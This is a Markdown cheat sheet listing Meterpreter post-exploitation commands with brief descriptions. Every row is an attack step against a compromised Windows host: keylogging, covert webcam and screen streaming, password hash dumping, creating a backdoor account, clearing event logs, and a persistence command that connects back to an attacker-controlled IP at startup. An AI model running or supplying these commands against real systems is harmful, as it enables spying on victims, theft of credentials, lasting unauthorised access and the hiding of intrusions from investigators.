# Meterpreter Commands

| Command | Description |
|---------|------|
| `sysinfo` | Displays system information |
| `dir`, `ls` | Lists files in the system |
| `screenshot` or `use espia; screengrab` | Takes a screenshot of the host |
| `screenshare` | Streams the host's screen live |
| `webcam_stream` | Streams the webcam live |
| `enumdesktops` | Lists all available desktops |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_dump` | Displays captured keystrokes |
| `uictl disable keyboard / mouse` | Disables the keyboard or mouse |
| `TASKLIST` | Lists active processes |
| `kill <PID>` (e.g., `kill 260`) | Terminates a process by PID |
| `cat plik.txt` | Views the content of a text file |
| `execute -f notepad.exe -c` | Creates a new communication channel |
| `download file.txt` | Downloads a file from the target system |
| `run winenum` | Gathers all system information |
| `run persistence -A -S -U -I 60 -p 4321 -r <attacker_ip>` | Sets up persistent access on system startup |
| `cd` | Changes the current directory |
| `cat` | Displays text file content in the console |
| `del` | Deletes files |
| `run getgui -u Hacker -p 1337` | Creates a new user account |
| `run getgui -e` | Enables remote desktop control |
| `clearev` | Clears system event logs |
| `session -l` | Lists active sessions |
| `run post/windows/gather/hashdump` | Dumps password hashes |